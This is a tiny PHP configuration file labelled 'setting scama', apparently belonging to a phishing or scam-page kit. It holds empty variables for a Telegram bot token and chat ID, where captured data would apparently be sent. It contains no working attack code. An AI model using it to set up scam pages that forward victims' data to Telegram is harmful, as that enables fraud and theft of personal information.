<?php
// setting scama

$botToken=""; // token bot telegram
$chatId="";  // chatId telegram

?>